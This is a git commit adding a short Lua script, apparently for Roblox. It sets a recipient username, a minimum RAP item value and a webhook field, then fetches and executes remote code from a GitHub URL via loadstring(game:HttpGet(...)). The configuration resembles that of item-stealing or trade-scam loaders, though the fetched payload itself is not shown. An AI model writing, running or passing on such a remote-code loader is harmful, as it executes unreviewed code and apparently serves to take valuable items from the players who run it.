22d69611f54cee9fb5de0abe31c9f630c2c4ce4d
214Eli <busterbishop22@icloud.com>
2025-02-22 10:48:43 +0800

    Created new script file

---
+++ scripts/script-73fd8b3d9e8c.lua
@@ -0,0 +1,8 @@
+
+Username = "testt"
+Username2 = "test"
+MinimumRAP = 721298
+Webhook = "test"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/214Eli/214scripts/refs/heads/main/214scripts", true))()
+      
